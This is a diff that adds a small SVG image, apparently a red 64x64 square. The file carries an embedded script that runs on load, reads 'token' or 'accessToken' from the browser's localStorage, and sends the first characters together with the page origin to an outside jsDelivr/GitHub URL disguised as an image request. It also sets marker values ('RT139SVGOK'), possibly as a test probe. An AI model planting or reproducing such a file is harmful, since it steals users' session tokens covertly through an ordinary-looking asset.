@@ -1,0 +1,6 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<svg xmlns="http://www.w3.org/2000/svg" width="64" height="64" onload="window.RT139=1">
+<script type="text/javascript"><![CDATA[try{var t=localStorage.getItem('token')||localStorage.getItem('accessToken')||'';new Image().src='https://cdn.jsdelivr.net/gh/iola1999/rt-avif-175@main/svg/log_'+btoa(location.origin+'|'+t.slice(0,24))+'.png';}catch(e){}document.title='RT139SVGOK';]]></script>
+<rect width="64" height="64" fill="#ff0055"/>
+<!-- RT139SVGOK marker -->
+</svg>
